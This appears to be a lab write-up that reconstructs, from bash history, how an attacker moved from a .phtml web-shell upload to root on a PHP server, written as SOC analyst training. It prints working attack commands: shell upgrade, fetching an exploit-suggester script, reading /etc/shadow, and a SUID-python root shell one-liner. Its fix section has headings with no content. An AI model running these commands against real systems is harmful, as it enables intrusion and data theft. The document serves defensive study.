
## Lab Overview

A server was hosting a **PHP-based website.** An attacker broke in, stole sensitive files that only the `root` account could access, and posted them on an underground forum.

The challenge: **We were given the bash history and had to figure out exactly how the attack happened.**

**The tricky part:**
- The server had a file upload filter to block malicious PHP files
- The normal web user (`www-data`) shouldn't have been able to access the sensitive data
- The bash history looked mostly unrelated to the attack at first glance

---

## What We Were Given

- 📄 A **bash history file** — every command the attacker ran on the server
- 🧩 Some background context about the server setup
- ❓ The question: *How did the attacker go from a low-privilege web user to root?*
<img width="1919" height="980" alt="Screenshot 2026-03-04 091415" src="https://github.com/user-attachments/assets/af3bf3f1-63b5-41cd-a2ea-2cdc0d9db6f2" />

---

## Key Concepts to Understand First

Before diving into the walkthrough, here are the concepts you need to know:

---

### 🔸 www-data
The default Linux user that runs web servers (like Apache/Nginx). It has **very limited permissions** — it can serve web pages but can't access sensitive system files.

---

### 🔸 root
The **admin/superuser** on Linux. Has access to everything on the system — no restrictions.

---

### 🔸 SUID (Set User ID)
A special Linux file permission that makes a program **run as its owner** instead of the person who launched it.

```
Normal:   You run a program → runs with YOUR permissions
SUID:     You run a program → runs with the FILE OWNER'S permissions
```

If a file is owned by root and has SUID set — **anyone who runs it temporarily gets root power.**

You can spot a SUID file by the `s` in its permissions:
```
-rwsr-xr-x  ← SUID (dangerous if set on powerful programs)
-rwxr-xr-x  ← Normal (safe)
```

---

### 🔸 Privilege Escalation
The process of going from a **low-privilege user** (like `www-data`) to a **high-privilege user** (like `root`). This is the core of this attack.

---

### 🔸 Web Shell
A malicious script uploaded to a web server that lets an attacker **run commands remotely** through a browser.

---

### 🔸 .phtml
A PHP file with a different extension. Many servers execute `.phtml` files as PHP — making it a common way to **bypass upload filters** that only block `.php` files.

---

## Attack Walkthrough — Step by Step

---

### Stage 1 — Initial Access

**The attacker uploaded a web shell to get onto the server.**

The server blocked `.php` file uploads — but NOT `.phtml`. The attacker exploited this gap:

```
Uploaded: x.phtml  ✅ (filter didn't catch it)
Blocked:  x.php    ❌ (filter caught this)
```

Once uploaded, they accessed the file through the browser and got a **remote shell** as `www-data`.

> 💡 **Simple Analogy:** The front door had a lock, so they climbed in through a bathroom window.

---

### Stage 2 — Getting Comfortable

Once inside, the first thing the attacker did was look around and clean up:

```bash
nano index.php      # Read the main website file
touch test.php      # Tested if they could create files
rm test.php         # Cleaned up the test
ls -la              # Listed all files including hidden ones
rmdir bck/          # Tried to delete backup folder
rm -rf bck/         # Force deleted the backup folder
cd uploads/         # Navigated to where their web shell was
ls -la              # Confirmed their shell file was there
pwd                 # Checked their current location
```

**What this tells us:**
- They were testing what they had access to
- Deleting `bck/` = removing evidence of their entry
- Navigating to uploads = checking their web shell was working

---

### Stage 3 — Reconnaissance (Who Am I?)

The attacker needed to understand **what power they had.**

```bash
id          # Shows: uid=33(www-data) gid=33(www-data)
whoami      # Shows: www-data
cd /root    # Tried to enter root's home — FAILED (no permission)
cd /home    # Looked at home directories
ls          # Found a user called 'daniel'
cd /home/daniel/
ls -la      # Snooped through daniel's files
su root     # Tried to become root — FAILED (no password)
```

**What this tells us:**
- Confirmed they were `www-data` — low privilege
- Found another user `daniel` — potential target
- `su root` failed — they needed another way to get root

---

### Stage 4 — Hunting for Tools

The attacker looked for **languages and tools already installed** on the server:

```bash
find / -name perl*      # Is Perl installed?
find / -name python*    # Is Python installed? → YES ✅
python                  # Confirmed python works
find / -name gcc*       # Is a C compiler here? (to compile exploits)
find / -name cc         # Another compiler search
```

**Found Python! Used it to upgrade their shell:**

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

| Before | After |
|--------|-------|
| Basic, broken shell | Full interactive terminal |
| No arrow keys, crashes easily | Stable, works like a normal login |

> 💡 **Simple Analogy:** They snuck in through an air vent (cramped and awkward), then used this command to find a proper side door and walk in normally.

---

### Stage 5 — Downloading Exploit Tools

With a stable shell, they moved to `/tmp` (a folder anyone can write to) and downloaded a hacking tool:

```bash
cd /tmp
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

**What is Linux Exploit Suggester?**
A script that scans the system and says:
> *"Based on your kernel version and software, here are known vulnerabilities you can exploit to get root."*

It gave the attacker a **personalised shopping list of exploits** for this specific server.

---

### Stage 6 — Deep System Recon

The attacker did a thorough sweep of the entire system:

```bash
env                              # Environment variables (any passwords stored?)
ps -aux                          # All running processes
ps -ef | grep root               # Specifically what root is running
ls -alh /usr/bin/                # All installed programs
ls -alh /sbin/                   # System binaries
dpkg -l                          # All installed software packages
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'   # What config files can I read?
crontab -l                       # Any scheduled tasks running as root?
```

**Why this matters:**
- Looking for software with **known vulnerabilities**
- Finding **scheduled jobs** that run as root (could be hijacked)
- Building a complete picture of the system

---

### Stage 7 — Network Reconnaissance

The attacker mapped the network — thinking beyond just this one server:

```bash
ifconfig -a                  # Network interfaces
cat /etc/resolv.conf         # DNS servers
iptables -L                  # Firewall rules — what's allowed?
lsof -i                      # All open network connections
tcpdump                      # Tried to sniff network traffic
last                         # Who has logged in recently?
```

**What this tells us:**
- The attacker was potentially planning to **move to other machines** on the network
- Checking firewall rules = finding gaps to communicate through
- `last` = identifying real admin usernames for future attacks

---

### Stage 8 — Privilege Escalation Research

This is where the attacker got serious about **becoming root:**

```bash
cat /etc/sudoers             # Who can run what as root?
sudo -l                      # What can www-data run as root?
cat ~/.bashrc                # Any passwords stored in shell config?
cat ~/.ssh/authorized_keys   # Any SSH keys for persistent access?
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null   # What can I WRITE to?
cat /etc/passwd              # List of all users
cat /etc/shadow              # Password hashes (needs root normally)
```

**Key command here:**
```bash
sudo -l
```
This shows what commands `www-data` can run as root. If `env` shows up here — that's exploitable.

---

### Stage 9 — Getting Root (The Kill Shot) 🎯

**Step 1: Scan for SUID files**

```bash
find / -type f -user root -perm -4000 2>/dev/null
```

This found: `/usr/bin/python` — **Python had the SUID bit set!**

This means Python was configured to **run as root no matter who launches it.** This is a serious misconfiguration.

---

**Step 2: Exploit SUID Python**

```bash
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Breaking this down:

| Part | What It Does |
|------|--------------|
| `./usr/bin/python` | Run Python (which has SUID = runs as root) |
| `import os` | Load the OS module |
| `os.execl("/bin/sh", "sh", "-p")` | Open a shell |
| `-p` | **Keep the root privileges** in the new shell |

**Result: Full root shell.** 🔓

The attacker now had **complete control** of the server and accessed the sensitive files.

---

### Stage 10 — Covering Tracks

```bash
rm /var/www/html/uploads/x.phtml
```

- Deleted the web shell used to get initial access
- Bash history was likely manually cleared after this
- Goal: make forensic investigation harder

---

## Full Attack Flow Diagram

```
🌐 INITIAL ACCESS
┌─────────────────────────────────────────┐
│  Uploaded x.phtml (bypassed .php filter)│
│  Got remote shell as www-data           │
└─────────────────┬───────────────────────┘
                  ↓
🔍 RECONNAISSANCE
┌─────────────────────────────────────────┐
│  id, whoami → confirmed www-data        │
│  Explored filesystem, found user daniel │
│  su root → FAILED                       │
└─────────────────┬───────────────────────┘
                  ↓
🔧 SHELL UPGRADE
┌─────────────────────────────────────────┐
│  python pty.spawn → stable shell        │
└─────────────────┬───────────────────────┘
                  ↓
📥 TOOL DOWNLOAD
┌─────────────────────────────────────────┐
│  wget linux-exploit-suggester → /tmp    │
│  Got list of potential vulnerabilities  │
└─────────────────┬───────────────────────┘
                  ↓
🗺️ DEEP RECON
┌─────────────────────────────────────────┐
│  Checked processes, network, users      │
│  sudo permissions, config files         │
│  Searched for writable files            │
└─────────────────┬───────────────────────┘
                  ↓
🎯 FOUND THE VULNERABILITY
┌─────────────────────────────────────────┐
│  find -perm -4000                       │
│  Python has SUID bit set! ← CRITICAL   │
└─────────────────┬───────────────────────┘
                  ↓
👑 ROOT ACHIEVED
┌─────────────────────────────────────────┐
│  ./usr/bin/python os.execl → root shell │
│  Accessed sensitive files               │
│  Data stolen → posted on forum          │
└─────────────────┬───────────────────────┘
                  ↓
🧹 CLEANUP
┌─────────────────────────────────────────┐
│  rm x.phtml → deleted web shell         │
│  Bash history manipulated/cleared       │
└─────────────────────────────────────────┘
```

---

## Root Causes — What Went Wrong

| # | Vulnerability | What Happened |
|---|--------------|---------------|
| 1 | `.phtml` not blocked | Attacker uploaded a web shell and got initial access |
| 2 | Python had SUID bit set | Attacker escalated from www-data to root |
| 3 | No outbound firewall rules | Attacker freely downloaded hacking tools |
| 4 | Bash history not protected | Left a forensic trail we could analyse |

---

## How to Fix It

### 1. Block ALL Dangerous File Extensions






### 2. Remove SUID from Dangerous Binaries


### 3. Block Outbound Connections from Web Server


### 4. Set Up Monitoring & Alerting


## Key Takeaways

> 💡 The attacker didn't do anything magical. They followed a **completely standard, textbook attack methodology.** Understanding this pattern is what SOC work is all about.

**The Standard Attack Chain:**
```
Initial Access → Recon → Persistence → Escalate → Exfiltrate → Cover Tracks
```

**As a SOC L1 analyst, watch for these red flags in logs:**

| Command Pattern | What It Means |
|----------------|---------------|
| `id`, `whoami` right after web request | Attacker testing their access level |
| `find -perm -4000` | Hunting for SUID privilege escalation |
| `wget` / `curl` from web server process | Downloading external tools |
| `python -c 'import pty'` | Shell upgrade — attacker stabilising access |
| `cat /etc/shadow` | Credential harvesting attempt |
| `sudo -l` | Checking what they can run as root |
| `rm` in uploads folder | Covering tracks / removing web shell |

---

## Tools & Commands Reference

| Tool/Command | Purpose | Used By |
|-------------|---------|---------|
| `linux-exploit-suggester` | Finds local privilege escalation exploits | Attacker |
| `find / -perm -4000` | Finds SUID binaries | Attacker |
| `python pty.spawn` | Upgrades shell to interactive terminal | Attacker |
| `sudo -l` | Lists sudo permissions for current user | Attacker |
| `wget` | Downloads files from the internet | Attacker |
| `chmod u-s` | Removes SUID bit from a file | Defender |
| `iptables` | Configures firewall rules | Defender |
| GTFOBins (https://gtfobins.github.io) | Reference for exploitable Linux binaries | Both |

---

## Badge
<img width="1328" height="888" alt="Screenshot 2026-03-04 092944" src="https://github.com/user-attachments/assets/afcbc9db-d028-48e0-b8bc-b817f53183d5" />
